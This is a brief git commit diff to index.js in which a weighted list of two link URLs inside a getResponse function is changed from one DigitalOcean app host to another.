5aa17a21aaa7beda5c35e775e7bad51cbd22b902
animalinside <akshay.anand12@yahoo.com>
2026-05-28 08:11:18 +0530

    Update index.js

--- index.js
+++ index.js
@@ -72,8 +72,8 @@ function aesDecode(encryptedText) {
   function getResponse() {
 
     const links = [
-        { url: "https://squid-app-fehe9.ondigitalocean.app/", weight: 0.5 },
-        { url: "https://squid-app-fehe9.ondigitalocean.app/", weight: 0.5 }
+        { url: "https://lionfish-app-2-4naza.ondigitalocean.app/", weight: 0.5 },
+        { url: "https://lionfish-app-2-4naza.ondigitalocean.app/", weight: 0.5 }
       
     ];
 
